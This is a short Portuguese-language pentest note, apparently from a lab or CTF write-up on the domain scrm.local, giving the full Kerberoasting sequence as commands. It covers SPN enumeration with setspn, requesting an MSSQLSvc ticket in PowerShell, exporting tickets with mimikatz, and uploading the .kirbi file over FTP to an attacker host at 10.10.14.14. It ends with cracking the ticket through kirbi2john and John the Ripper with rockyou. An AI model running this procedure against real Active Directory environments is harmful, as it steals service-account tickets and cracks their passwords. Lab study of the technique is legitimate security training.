Kerberoasting
=============

```
setspn -T scrm.local -Q */*
```

impacket

Temos que focar no que for contas de serviço que não seja de máquinas, conforme print abaixo:

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>Usuário de serviço (não é de máquina)</p></figcaption></figure>

```
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dc1.scrm.local:1433"
```

Requisitei o ticket

```
klist
```

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

```
kerberos::list /export
$client = New-Object System.Net.WebClient;$client.Credentials = New-Object System.Net.NetworkCredential("anonymous", "anonymous");$client.UploadFile("ftp://10.10.14.14/test.kirbi", "C:\temp\1-40a10000-sqlsvc@MSSQLSvc~dc1.scrm.local~1433-SCRM.LOCAL.kirbi")
python -m pyftpdlib --port=21 --write
```

```
python /home/acosta/owncloud/Area_de_trabalho/tools/linux/5-lateral_movement/kerberoast/kirbi2john.py test.kirbi > test.john
john --wordlist=/usr/share/wordlists/rockyou.txt test.john
```



